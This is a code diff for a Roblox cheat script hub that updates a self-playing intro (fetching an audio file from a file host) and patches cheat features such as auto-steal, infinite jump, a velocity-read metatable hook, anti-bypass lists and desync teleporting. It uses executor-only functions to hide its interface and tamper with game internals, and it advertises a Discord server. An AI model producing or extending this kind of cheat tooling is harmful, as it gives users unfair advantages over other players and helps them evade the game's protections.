@@ -4,141 +4,329 @@ _G.BloodHoundsRunning = true
 repeat task.wait() until game:IsLoaded()
 
 -- ============================================================
--- INTRO (Made By Fajaco For Shox)
+-- SHox Code Sniper style intro (visual/audio only; no Code Sniper hooks)
 -- ============================================================
--- Made By Fajaco For Shox
+local ShoxHubPlayers = game:GetService("Players")
+local ShoxHubTweenService = game:GetService("TweenService")
+local ShoxHubRunService = game:GetService("RunService")
+local ShoxHubSoundService = game:GetService("SoundService")
+local ShoxHubHttpService = game:GetService("HttpService")
+local ShoxHubPlayer = ShoxHubPlayers.LocalPlayer
 
-local ShoxHubPlayers=game:GetService("Players")
-local ShoxHubTweenService=game:GetService("TweenService")
-local ShoxHubRunService=game:GetService("RunService")
-local ShoxHubPlayer=ShoxHubPlayers.LocalPlayer
-local ShoxHubGuiName="ShoxLettersIntro"
-local ShoxHubSongs={"https://files.catbox.moe/vbyghu.mp3","https://files.catbox.moe/5g2wg1.mp3","https://files.catbox.moe/r29x0i.mp3","https://files.catbox.moe/n53amf.mp3","https://files.catbox.moe/o4di3j.mp3","https://files.catbox.moe/um4hgp.mp3","https://files.catbox.moe/fiiu4a.mp3","https://files.catbox.moe/mdjmee.mp3","https://files.catbox.moe/2eysnf.mp3","https://files.catbox.moe/d4uky5.mp3","https://files.catbox.moe/8v5xra.mp3","https://files.catbox.moe/aneanv.mp3","https://files.catbox.moe/pm6lne.mp3","https://files.catbox.moe/y4q5y3.mp3","https://files.catbox.moe/pcdvty.mp3"}
-local ShoxHubSongIndex=1
-pcall(function()
-    if isfile and readfile and isfile("FictionHub.json") then
-        local ShoxHubSaved=game:GetService("HttpService"):JSONDecode(readfile("FictionHub.json"))
-        if type(ShoxHubSaved.shoxHubSongIndex)=="number" then ShoxHubSongIndex=math.clamp(math.floor(ShoxHubSaved.shoxHubSongIndex),1,#ShoxHubSongs) end
-    end
-end)
-local ShoxHubSongUrl=ShoxHubSongs[ShoxHubSongIndex]
-local ShoxHubSongFile="shoxhub_intro_song_"..ShoxHubSongIndex..".mp3"
-local ShoxHubIntroSound=nil
-local ShoxHubSoundEndedConnection=nil
+local ShoxIntro = {
+    Running = true,
+    Token = 0,
+    Letters = {"S", "H", "O", "X", "H", "U", "B"},
+    Beats = {
+        {0.05, 1, "a"}, {0.52, 1, "b"}, {0.84, 0.6}, {1.28, 0.9},
+        {1.58, 0.5}, {1.88, 0.9}, {2.11, 0.6}, {2.48, 2.2, "drop"},
+        {3.15, 1}, {3.74, 1}, {4.34, 1.2}, {4.75, 1.7, "end"},
+    },
+    IntroUrl = "https://files.catbox.moe/ocdxaf.ogg",
+    Dir = "CodeSniper",
+    MusicDir = "CodeSniper/music",
+}
+local ShoxIntroGui, ShoxIntroSound, ShoxIntroHeartbeat
 
-for _,ShoxHubParent in ipairs({game:GetService("CoreGui"),ShoxHubPlayer and ShoxHubPlayer:FindFirstChildOfClass("PlayerGui")}) do
-    local ShoxHubOld=ShoxHubParent and ShoxHubParent:FindFirstChild(ShoxHubGuiName)
-    if ShoxHubOld then ShoxHubOld:Destroy() end
+local function shoxIntroMake(className, props, parent)
+    local obj = Instance.new(className)
+    for k, v in pairs(props) do obj[k] = v end
+    if parent then obj.Parent = parent end
+    return obj
 end
 
-local ShoxHubGui=Instance.new("ScreenGui")
-ShoxHubGui.Name=ShoxHubGuiName; ShoxHubGui.IgnoreGuiInset=true; ShoxHubGui.ResetOnSpawn=false; ShoxHubGui.DisplayOrder=100000
-ShoxHubGui.ZIndexBehavior=Enum.ZIndexBehavior.Global
-pcall(function() if syn and syn.protect_gui then syn.protect_gui(ShoxHubGui) end end)
-if not pcall(function() ShoxHubGui.Parent=game:GetService("CoreGui") end) then ShoxHubGui.Parent=ShoxHubPlayer:WaitForChild("PlayerGui") end
+local function shoxIntroTween(obj, props, duration, style, direction)
+    local tween = ShoxHubTweenService:Create(
+        obj,
+        TweenInfo.new(duration or 0.25, style or Enum.EasingStyle.Quint, direction or Enum.EasingDirection.Out),
+        props
+    )
+    tween:Play()
+    return tween
+end
 
-local ShoxHubAssets={
-    "rbxassetid://102527460927859",
-    "rbxassetid://115218770459100",
-    "rbxassetid://79239854929751",
-    "rbxassetid://132491364078344",
-    "rbxassetid://88405482927089",
-}
+local function shoxIntroParent()
+    local ok, hui = pcall(function() return gethui and gethui() end)
+    if ok and hui then return hui end
+    local pg = ShoxHubPlayer:FindFirstChildOfClass("PlayerGui")
+    return pg or game:GetService("CoreGui")
+end
 
-local ShoxHubLetters={}
-local ShoxHubStarted=os.clock()
-local ShoxHubFloatConnection
-local ShoxHubFinished=false
-
-for ShoxHubIndex,ShoxHubAsset in ipairs(ShoxHubAssets) do
-    local ShoxHubLetter=Instance.new("ImageLabel",ShoxHubGui)
-    ShoxHubLetter.Name="ShoxLetter"..ShoxHubIndex
-    ShoxHubLetter.AnchorPoint=Vector2.new(.5,.5)
-    ShoxHubLetter.Size=UDim2.fromOffset(340,340)
-    ShoxHubLetter.Position=UDim2.new(.5,(ShoxHubIndex-3)*225,.5,-18)
-    ShoxHubLetter.BackgroundTransparency=1
-    ShoxHubLetter.Image=ShoxHubAsset
-    ShoxHubLetter.ScaleType=Enum.ScaleType.Fit
-    ShoxHubLetter.ImageTransparency=1
-    ShoxHubLetter.ZIndex=3
-    ShoxHubLetters[ShoxHubIndex]={image=ShoxHubLetter,base=ShoxHubLetter.Position,ShoxHubIndex=ShoxHubIndex}
-    task.delay((ShoxHubIndex-1)*.07,function()
-        if ShoxHubLetter.Parent then
-            ShoxHubTweenService:Create(ShoxHubLetter,TweenInfo.new(.42,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{ImageTransparency=0}):Play()
+local function shoxIntroFinish(stopSound)
+    if not ShoxIntro.Running then return end
+    ShoxIntro.Running = false
+    if ShoxIntroHeartbeat then ShoxIntroHeartbeat:Disconnect(); ShoxIntroHeartbeat = nil end
+    if stopSound and ShoxIntroSound then
+        pcall(function() ShoxIntroSound:Stop(); ShoxIntroSound:Destroy() end)
+    end
+    ShoxIntroSound = nil
+    if ShoxIntroGui then
+        local gui = ShoxIntroGui
+        ShoxIntroGui = nil
+        shoxIntroTween(gui:FindFirstChild("IntroBG"), {BackgroundTransparency = 1}, 0.25)
+        for _, obj in ipairs(gui:GetDescendants()) do
+            if obj:IsA("TextLabel") then
+                shoxIntroTween(obj, {TextTransparency = 1}, 0.2)
+            elseif obj:IsA("Frame") and obj.Name ~= "IntroBG" then
+                shoxIntroTween(obj, {BackgroundTransparency = 1}, 0.2)
+            end
         end
+        task.delay(0.28, function()
+            if gui and gui.Parent then gui:Destroy() end
+        end)
+    end
+end
+
+local function shoxIntroSpark(stage, letters, count, wide, accent)
+    for _ = 1, count do
+        local angle = math.random() * math.pi * 2
+        local distance = (wide and 260 or 130) * (0.4 + math.random() * 0.8)
+        local x = letters[math.random(1, #letters)].x
+        local particle = shoxIntroMake("Frame", {
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, x, 0.5, -10),
+            Size = UDim2.fromOffset(6, 6),
+            Rotation = math.random(0, 90),
+            BackgroundColor3 = accent,
+            BorderSizePixel = 0,
+        }, stage)
+        shoxIntroTween(particle, {
+            Position = UDim2.new(0.5, x + math.cos(angle) * distance, 0.5, -10 + math.sin(angle) * distance),
+            BackgroundTransparency = 1,
+            Size = UDim2.fromOffset(2, 2),
+        }, 0.55)
+        task.delay(0.6, function()
+            if particle and particle.Parent then particle:Destroy() end
+        end)
+    end
+end
+
+local function shoxIntroRing(stage, accent, thickness)
+    local ring = shoxIntroMake("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, 0, 0.5, -10),
+        Size = UDim2.fromOffset(40, 40),
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+    }, stage)
+    shoxIntroMake("UICorner", {CornerRadius = UDim.new(1, 0)}, ring)
+    local stroke = shoxIntroMake("UIStroke", {Thickness = thickness, Color = accent}, ring)
+    shoxIntroTween(ring, {Size = UDim2.fromOffset(820, 820)}, 0.7)
+    shoxIntroTween(stroke, {Transparency = 1}, 0.7)
+    task.delay(0.8, function()
+        if ring and ring.Parent then ring:Destroy() end
     end)
 end
 
-local function ShoxHubFinish()
-    if ShoxHubFinished then return end
-    ShoxHubFinished=true
-    if ShoxHubFloatConnection then ShoxHubFloatConnection:Disconnect() end
-    if ShoxHubSoundEndedConnection then ShoxHubSoundEndedConnection:Disconnect(); ShoxHubSoundEndedConnection=nil end
-    if ShoxHubIntroSound then pcall(function() ShoxHubIntroSound:Stop(); ShoxHubIntroSound:Destroy() end) end
-    for _,ShoxHubEntry in ipairs(ShoxHubLetters) do
-        if ShoxHubEntry.image.Parent then ShoxHubTweenService:Create(ShoxHubEntry.image,TweenInfo.new(.3),{ImageTransparency=1}):Play() end
-    end
-    task.delay(.34,function() if ShoxHubGui then ShoxHubGui:Destroy() end end)
-end
+local function shoxIntroPlay()
+    local accent = Color3.fromRGB(120, 200, 255)
+    local subColor = Color3.fromRGB(170, 205, 235)
+    local gui = shoxIntroMake("ScreenGui", {
+        Name = "ShoxCodeSniperIntro",
+        ResetOnSpawn = false,
+        IgnoreGuiInset = true,
+        DisplayOrder = 9999,
+        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    }, shoxIntroParent())
+    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+    ShoxIntroGui = gui
 
-ShoxHubFloatConnection=ShoxHubRunService.RenderStepped:Connect(function()
-    local ShoxHubTime=os.clock()-ShoxHubStarted
-    for _,ShoxHubEntry in ipairs(ShoxHubLetters) do
-        local ShoxHubLetter=ShoxHubEntry.image
-        if ShoxHubLetter.Parent then
-            local ShoxHubPhase=ShoxHubTime*.9+ShoxHubEntry.ShoxHubIndex*1.37
-            ShoxHubLetter.Position=ShoxHubEntry.base+UDim2.fromOffset(math.sin(ShoxHubPhase)*18,math.cos(ShoxHubPhase*1.23)*22)
-            ShoxHubLetter.Rotation=math.sin(ShoxHubPhase*.72)*7
+    local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
+    local base = math.clamp(math.min(viewport.X * 0.6 / 376, viewport.Y * 0.4 / 80), 0.5, 3)
+    local bg = shoxIntroMake("Frame", {
+        Name = "IntroBG", Size = UDim2.fromScale(1, 1),
+        BackgroundColor3 = Color3.fromRGB(10, 22, 40),
+        BackgroundTransparency = 1, BorderSizePixel = 0, Active = false,
+    }, gui)
+    shoxIntroTween(bg, {BackgroundTransparency = 0}, 0.3)
+
+    local stage = shoxIntroMake("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Active = false,
+    }, gui)
+    local stageScale = shoxIntroMake("UIScale", {Scale = base}, stage)
+    local letters = {}
+    for i, character in ipairs(ShoxIntro.Letters) do
+        local x = -163 + (i - 1) * 50 + (i >= 5 and 26 or 0)
+        local wrap = shoxIntroMake("Frame", {
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, x, 0.5, -10),
+            Size = UDim2.fromOffset(50, 80),
+            BackgroundTransparency = 1, BorderSizePixel = 0, Active = false,
+        }, stage)
+        local letterScale = shoxIntroMake("UIScale", {Scale = 1}, wrap)
+        local label = shoxIntroMake("TextLabel", {
+            Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+            Text = character, Font = Enum.Font.GothamBlack, TextSize = 76,
+            TextColor3 = accent, TextTransparency = 1, Active = false,
+        }, wrap)
+        letters[i] = {w = wrap, us = letterScale, lb = label, x = x, hit = -10, amp = 0, rev = math.huge}
+    end
+
+    local line = shoxIntroMake("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 52),
+        Size = UDim2.fromOffset(0, 4), BackgroundColor3 = accent, BorderSizePixel = 0,
+    }, stage)
+    local subtitle = shoxIntroMake("TextLabel", {
+        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 80),
+        Size = UDim2.fromOffset(376, 22), BackgroundTransparency = 1,
+        Text = "discord.gg/EA7xS26mA9", Font = Enum.Font.GothamBold,
+        TextSize = 17, TextColor3 = subColor, TextTransparency = 1,
+    }, stage)
+    local flash = shoxIntroMake("Frame", {
+        Size = UDim2.fromScale(1, 1), BackgroundColor3 = accent,
+        BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 5, Active = false,
+    }, gui)
+    local skip = shoxIntroMake("TextButton", {
+        AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -14, 0, 14),
+        Size = UDim2.fromOffset(78, 32), BackgroundColor3 = Color3.fromRGB(24, 48, 80),
+        Text = "Skip", TextColor3 = Color3.fromRGB(225, 242, 255),
+        Font = Enum.Font.GothamBold, TextSize = 14, AutoButtonColor = false,
+        BorderSizePixel = 0, ZIndex = 10, Active = true,
+    }, gui)
+    shoxIntroMake("UICorner", {CornerRadius = UDim.new(0, 9)}, skip)
+    shoxIntroMake("UIStroke", {Color = accent, Thickness = 1, Transparency = 0.55}, skip)
+    skip.Activated:Connect(function() shoxIntroFinish(true) end)
+
+    local timeline, beatIndex = 0, 1
+    local pulse, shake, flashAlpha, underline, subtitleAlpha = 0, 0, 0, 0, 0
+    local startedAt = os.clock()
+    local audioStarted = false
+
+    local function fireBeat(beat)
+        local strength, kind = beat[2], beat[3]
+        pulse = math.max(pulse, 0.05 + 0.06 * strength)
+        shake = math.max(shake, 6 * strength)
+        flashAlpha = math.max(flashAlpha, math.min(0.1 * strength, 0.35))
+        local first, last, amplitude = 1, #letters, 0.3 * strength
+        if kind == "a" then first, last, amplitude = 1, 4, 1.6
+        elseif kind == "b" then first, last, amplitude = 5, 7, 1.6 end
+        for i = first, last do
+            local entry = letters[i]
+            entry.hit = timeline + (i - first) * 0.035
+            entry.amp = amplitude
+            if amplitude > 1 then entry.rev = entry.hit end
+        end
+        if kind == "drop" then
+            pulse, shake, flashAlpha = 0.35, 26, 0.75
+            shoxIntroRing(stage, accent, 6)
+            task.delay(0.12, function() if ShoxIntro.Running then shoxIntroRing(stage, accent, 3) end end)
+            shoxIntroSpark(stage, letters, 24, true, accent)
+        elseif kind == "end" then
+            pulse, shake, flashAlpha = 0.3, 20, 0.6
+            shoxIntroRing(stage, accent, 5)
+            shoxIntroSpark(stage, letters, 18, true, accent)
+        else
+            shoxIntroSpark(stage, letters, math.floor(4 * strength) + 2, false, accent)
         end
     end
-end)
 
-task.spawn(function()
-    local function ShoxHubCustomAsset(ShoxHubFile)
-        local ShoxHubAssetFunctions = {getcustomasset, getsynasset, getasset}
-        for _, ShoxHubAssetFunction in pairs(ShoxHubAssetFunctions) do
-            if typeof(ShoxHubAssetFunction) == "function" then
-                local ShoxHubOk, ShoxHubAsset = pcall(ShoxHubAssetFunction, ShoxHubFile)
-                if ShoxHubOk and type(ShoxHubAsset) == "string" and ShoxHubAsset ~= "" then
-                    return ShoxHubAsset
-                end
+    local sound = ShoxIntroSound
+    local fadeStart, fadeEnd = 4.95, 5.5
+    ShoxIntroHeartbeat = ShoxHubRunService.Heartbeat:Connect(function(dt)
+        if not ShoxIntro.Running then return end
+        if sound and sound.IsPlaying then
+            audioStarted = true
+            timeline = sound.TimePosition
+        elseif audioStarted then
+            timeline = timeline + dt
+        else
+            timeline = timeline + dt
+            if os.clock() - startedAt > 8 then
+                shoxIntroFinish(true)
+                return
             end
         end
-        return nil
-    end
-    local ShoxHubAsset=ShoxHubCustomAsset(ShoxHubSongFile)
-    if not ShoxHubAsset and isfile and isfile(ShoxHubSongFile) then ShoxHubAsset=ShoxHubCustomAsset(ShoxHubSongFile) end
-    if not ShoxHubAsset and writefile then
-        local ShoxHubOk,ShoxHubData=pcall(function() return game:HttpGet(ShoxHubSongUrl) end)
-        if ShoxHubOk and type(ShoxHubData)=="string" and #ShoxHubData>100 and pcall(function() writefile(ShoxHubSongFile,ShoxHubData) end) then
-            ShoxHubAsset=ShoxHubCustomAsset(ShoxHubSongFile)
+        while ShoxIntro.Beats[beatIndex] and timeline >= ShoxIntro.Beats[beatIndex][1] do
+            fireBeat(ShoxIntro.Beats[beatIndex])
+            beatIndex = beatIndex + 1
         end
-    end
-    if ShoxHubFinished or not ShoxHubAsset then return end
-    ShoxHubIntroSound=Instance.new("Sound")
-    ShoxHubIntroSound.Name="ShoxIntroSong"; ShoxHubIntroSound.SoundId=ShoxHubAsset; ShoxHubIntroSound.Volume=1; ShoxHubIntroSound.Looped=false
-    ShoxHubIntroSound.Parent=game:GetService("SoundService")
-    ShoxHubSoundEndedConnection=ShoxHubIntroSound.Ended:Connect(ShoxHubFinish)
-    pcall(function() ShoxHubIntroSound:Play() end)
-end)
-
-local ShoxHubSkip=Instance.new("TextButton",ShoxHubGui)
-ShoxHubSkip.Size=UDim2.fromScale(1,1)
-ShoxHubSkip.BackgroundTransparency=1
-ShoxHubSkip.Text=""
-ShoxHubSkip.BorderSizePixel=0
-ShoxHubSkip.AutoButtonColor=false
-ShoxHubSkip.ZIndex=10
-ShoxHubSkip.Activated:Connect(ShoxHubFinish)
-
-task.delay(10, ShoxHubFinish)
-
-while not ShoxHubFinished do
-    task.wait(0.05)
+        local fade = math.clamp((timeline - fadeStart) / (fadeEnd - fadeStart), 0, 1)
+        pulse = pulse * math.exp(-dt * 7)
+        shake = shake * math.exp(-dt * 9)
+        flashAlpha = flashAlpha * math.exp(-dt * 8)
+        local shakeNow = shake > 0.3 and shake or 0
+        stage.Position = UDim2.new(0.5, (math.random() - 0.5) * 2 * shakeNow, 0.5, (math.random() - 0.5) * 2 * shakeNow)
+        stage.Rotation = (math.random() - 0.5) * 0.3 * shakeNow
+        stageScale.Scale = base * (1 + pulse) * (1 + fade * 0.5)
+        flash.BackgroundTransparency = 1 - flashAlpha
+        bg.BackgroundTransparency = fade
+        for i, entry in ipairs(letters) do
+            local age = timeline - entry.hit
+            entry.lb.TextTransparency = (timeline >= entry.rev) and fade or 1
+            local damp = age >= 0 and math.exp(-age * 5.5) or 0
+            entry.w.Position = UDim2.new(0.5, entry.x, 0.5, -10 - (age >= 0 and math.abs(math.sin(age * 12)) * 22 * damp or 0))
+            entry.w.Rotation = age >= 0 and math.sin(age * 10) * 7 * damp * (i % 2 == 0 and 1 or -1) or 0
+            entry.us.Scale = 1 + (age >= 0 and entry.amp * math.exp(-age * 8) or 0)
+        end
+        if timeline >= 0.84 then underline = math.min(1, underline + dt * 3.5) end
+        line.Size = UDim2.fromOffset(376 * underline, 4)
+        line.BackgroundTransparency = fade
+        if timeline >= 3.15 then subtitleAlpha = math.min(1, subtitleAlpha + dt * 5) end
+        subtitle.TextTransparency = math.max(1 - subtitleAlpha, fade)
+        skip.BackgroundTransparency = fade
+        skip.TextTransparency = fade
+        if timeline >= fadeEnd then shoxIntroFinish(false) end
+    end)
 end
 
-task.wait(0.4)
+local function shoxIntroLoadAudio()
+    local folder = ShoxIntro.MusicDir
+    pcall(function() if makefolder then makefolder(ShoxIntro.Dir) end end)
+    pcall(function() if makefolder then makefolder(folder) end end)
+    local path = folder .. "/intro.ogg"
+    local mp3Path = folder .. "/intro.mp3"
+    local assetFn = getcustomasset or getsynasset or getasset
+    if type(assetFn) == "function" and isfile then
+        for _, candidate in ipairs({path, mp3Path}) do
+            local okFile, exists = pcall(isfile, candidate)
+            if okFile and exists then
+                local okAsset, asset = pcall(assetFn, candidate)
+                if okAsset and type(asset) == "string" then return asset end
+            end
+        end
+    end
+    local rq = request or http_request or (syn and syn.request)
+    local body
+    if type(rq) == "function" then
+        local okReq, response = pcall(rq, {Url = ShoxIntro.IntroUrl, Method = "GET"})
+        if okReq and type(response) == "table" and response.StatusCode == 200 then body = response.Body end
+    end
+    if type(body) ~= "string" or #body < 1000 then
+        local okHttp, response = pcall(function() return game:HttpGet(ShoxIntro.IntroUrl) end)
+        if okHttp and type(response) == "string" and #response > 1000 then body = response end
+    end
+    if type(body) == "string" and #body > 1000 and writefile and type(assetFn) == "function" then
+        local extension = body:sub(1, 4) == "OggS" and "ogg" or "mp3"
+        local savePath = folder .. "/intro." .. extension
+        local okWrite = pcall(writefile, savePath, body)
+        if okWrite then
+            local okAsset, asset = pcall(assetFn, savePath)
+            if okAsset and type(asset) == "string" then return asset end
+        end
+    end
+    return nil
+end
 
+task.spawn(function()
+    local asset = nil
+    pcall(function() asset = shoxIntroLoadAudio() end)
+    if not ShoxIntro.Running then return end
+    if asset then
+        local sound = Instance.new("Sound")
+        sound.Name = "ShoxCodeSniperIntroAudio"
+        sound.SoundId = asset
+        sound.Volume = 0.6
+        sound.Looped = false
+        sound.Parent = ShoxHubSoundService
+        ShoxIntroSound = sound
+        pcall(function() sound:Play() end)
+    end
+    shoxIntroPlay()
+end)
+
+
+-- Intro is self-cleaning; the main FictionHub UI remains unchanged below.
 -- ============================================================
 -- FIN INTRO
 -- ============================================================
@@ -574,6 +762,13 @@ function CarrySystem:getCurrentSpeed() return self:getActiveSpeed() end
 
 local COLOR_THEMES = {
     ["Gris"] = Color3.fromRGB(30, 30, 35),
+    ["Abyss Blue"] = Color3.fromRGB(0, 120, 255),
+    ["Venom Green"] = Color3.fromRGB(20, 220, 70),
+    ["Royal Gold"] = Color3.fromRGB(255, 190, 35),
+    ["Velvet Rose"] = Color3.fromRGB(230, 45, 125),
+    ["Crimson Night"] = Color3.fromRGB(190, 25, 45),
+    ["Violet"] = Color3.fromRGB(150, 75, 255),
+    ["Cyan"] = Color3.fromRGB(0, 210, 220),
 }
 
 currentColorTheme = "Gris"
@@ -635,7 +830,19 @@ function updateAllUIThemeColors(color)
                 end
             end
             if child:IsA("UIStroke") then
-                if child.Color == Color3.fromRGB(95, 95, 105) or child.Color == Color3.fromRGB(180, 180, 190) then child.Color = color end
+                if child.Color == Color3.fromRGB(95, 95, 105) or child.Color == Color3.fromRGB(180, 180, 190) then
+                    child.Color = color
+                end
+            elseif child:IsA("Frame") or child:IsA("TextButton") or child:IsA("ImageButton") then
+                local old = child.BackgroundColor3
+                if old == Color3.fromRGB(95, 95, 105) or old == Color3.fromRGB(180, 180, 190)
+                    or old == Color3.fromRGB(120, 120, 130) then
+                    child.BackgroundColor3 = color
+                end
+            elseif child:IsA("TextButton") or child:IsA("ImageButton") then
+                if child.TextColor3 == Color3.fromRGB(95, 95, 105) or child.TextColor3 == Color3.fromRGB(180, 180, 190) then
+                    child.TextColor3 = color
+                end
             end
         end
     end
@@ -955,10 +1162,6 @@ local function applyHeadlessKorblox(char)
     if targetPart then
         local oldAsset = char:FindFirstChild("Korblox_RightLeg")
         if oldAsset then oldAsset:Destroy() end
-        for _, partName in ipairs(rightLegConfig.partsToHide) do
-            local limb = char:FindFirstChild(partName)
-            if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
-        end
         local success, objects = pcall(function() return game:GetObjects(rightLegConfig.id) end)
         if success and objects and #objects > 0 then
             local assetModel = objects[1]
@@ -973,6 +1176,12 @@ local function applyHeadlessKorblox(char)
                 weld.Part1 = mainMesh
                 weld.Parent = mainMesh
                 assetModel.Parent = char
+                for _, partName in ipairs(rightLegConfig.partsToHide) do
+                    local limb = char:FindFirstChild(partName)
+                    if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
+                end
+            else
+                pcall(function() assetModel:Destroy() end)
             end
         end
     end
@@ -1164,7 +1373,12 @@ _G.AceAntiBypassSlapList = _G.AceAntiBypassSlapList or {
     "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"
 }
 
-_G.AceSafeModeTryStart      = _G.AceSafeModeTryStart      or _G.AmbitiousSafeModeTryStart
+-- Resolve the Safe Mode function at call time; its implementation is defined later.
+_G.AceSafeModeTryStart = function(...)
+    local safeModeStart = _G.AmbitiousSafeModeTryStart
+    if type(safeModeStart) ~= "function" then return false end
+    return safeModeStart(...)
+end
 _G.AceStopAutoTPForAction   = _G.AceStopAutoTPForAction   or function()
     if batDesyncTpEnabled and type(stopBatDesyncTp) == "function" then
         stopBatDesyncTp()
@@ -1947,6 +2161,12 @@ function _G.AmbitiousHookNormalInfMobileJumpButton(obj)
     if not obj or obj.Name ~= "JumpButton"
        or not obj:IsA("GuiButton") or S.hooked[obj] then return end
     S.hooked[obj] = true
+    -- Activated fires reliably for Roblox's built-in mobile jump button.
+    obj.Activated:Connect(function()
+        if infJumpEnabled and infJumpMode ~= "MANUAL" then
+            _G.AmbitiousApplyNormalInfJumpBoost(50)
+        end
+    end)
     obj.InputBegan:Connect(function(input)
         if input.UserInputType ~= Enum.UserInputType.Touch
            or not infJumpEnabled then return end
@@ -2069,6 +2289,7 @@ local function _hookVelHRP(hrp)
             elseif type(originalVelIndex) == "table" then
                 return originalVelIndex[key]
             end
+            return nil
         end)
         setreadonly(mt, true)
     end)
@@ -2076,8 +2297,9 @@ local function _hookVelHRP(hrp)
 end
 
 if LP.Character then
-    local _hrp0 = _setupVelChecked(LP.Character)
-    _hookVelHRP(_hrp0)
+    -- Keep velocity tracking metadata, but do not intercept Roblox's velocity reads.
+    -- The old 20-stud/s clamp could interfere with the Humanoid jump controller.
+    _setupVelChecked(LP.Character)
 end
 
 local function _isRagdollState(hum)
@@ -2159,7 +2381,8 @@ local function applyAnimPack(packName)
     if animSelectorLabel then animSelectorLabel.Text = packName end
     if packName == "Off" then
         if originalTryardAnims and LP.Character then
-            local animate = LP.Character:FindFirstChild("Animate")
+            local character = LP.Character
+            local animate = character and character:FindFirstChild("Animate")
             if animate then
                 local function s(obj,id) if obj then obj.AnimationId = id end end
                 s(animate.idle and animate.idle.Animation1, originalTryardAnims.idle1)
@@ -2395,6 +2618,8 @@ local function executeSteal(prompt, podName)
     if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
     if progressPct then progressPct.Text = "0%" end
     task.spawn(function()
+        local recursionStarted = false
+        local workerOk, workerErr = xpcall(function()
         for _, f in ipairs(data.hold) do task.spawn(f) end
         local startTime = _tick()
         local duration = Steal.StealDuration
@@ -2407,12 +2632,12 @@ local function executeSteal(prompt, podName)
                 local progress = _clamp(elapsed / duration, 0, 1)
                 if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                 if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
-                if not prompt.Parent or not prompt.Parent.Parent then break end
+                local targetParent = prompt.Parent and prompt.Parent.Parent
+                local targetPart = targetParent and (targetParent:IsA("BasePart") and targetParent or targetParent:FindFirstChildWhichIsA("BasePart", true))
+                if not targetPart then break end
                 local char = LP.Character
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then
-                    break
-                end
+                if hrp and (hrp.Position - targetPart.Position).Magnitude > Steal.StealRadius then break end
                 task.wait()
             end
             local stopProgress = _clamp(stopTime / duration, 0, 1)
@@ -2428,10 +2653,15 @@ local function executeSteal(prompt, podName)
                     isStealing = false
                     task.wait()
                     local newPrompt, newName = findNearestPrompt()
-                    if newPrompt then executeSteal(newPrompt, newName) end
+                    if newPrompt then
+                        executeSteal(newPrompt, newName)
+                        recursionStarted = isStealing
+                    end
                     return
                 end
-                if not prompt.Parent or not prompt.Parent.Parent then
+                local targetParent = prompt.Parent and prompt.Parent.Parent
+                local targetPart = targetParent and (targetParent:IsA("BasePart") and targetParent or targetParent:FindFirstChildWhichIsA("BasePart", true))
+                if not targetPart then
                     isStealing = false
                     if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                     if progressPct then progressPct.Text = "0%" end
@@ -2441,7 +2671,7 @@ local function executeSteal(prompt, podName)
                 local char = LP.Character
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
                 if hrp then
-                    local dist = (hrp.Position - prompt.Parent.Parent.Position).Magnitude
+                    local dist = (hrp.Position - targetPart.Position).Magnitude
                     if dist <= autoGrabSetDelayRadius then
                         break
                     elseif dist > Steal.StealRadius then
@@ -2481,10 +2711,12 @@ local function executeSteal(prompt, podName)
                 local progress = _clamp(elapsed / duration, 0, 1)
                 if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                 if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
-                if not prompt.Parent or not prompt.Parent.Parent then break end
+                local targetParent = prompt.Parent and prompt.Parent.Parent
+                local targetPart = targetParent and (targetParent:IsA("BasePart") and targetParent or targetParent:FindFirstChildWhichIsA("BasePart", true))
+                if not targetPart then break end
                 local char = LP.Character
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then break end
+                if hrp and (hrp.Position - targetPart.Position).Magnitude > Steal.StealRadius then break end
                 if elapsed >= duration and not promptFired then
                     promptFired = true
                     pcall(function()
@@ -2500,8 +2732,16 @@ local function executeSteal(prompt, podName)
         end
         if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
         if progressPct then progressPct.Text = "0%" end
-        data.ready = true
-        isStealing = false
+        end, function(err) return tostring(err) end)
+        if not recursionStarted then
+            data.ready = true
+            isStealing = false
+        end
+        if not workerOk then
+            data.ready = true
+            if not recursionStarted then isStealing = false end
+            warn("[ShoxHub] Auto-Steal worker recovered: " .. tostring(workerErr))
+        end
     end)
 end
 
@@ -2730,7 +2970,8 @@ do
         end
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= LP and player.Character then
-                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                local character = player.Character
+                local root = character and character:FindFirstChild("HumanoidRootPart")
                 if root then
                     local currentY  = root.Position.Y
                     local previousY = mirrorTPPreviousY[player.UserId]
@@ -2809,8 +3050,6 @@ end
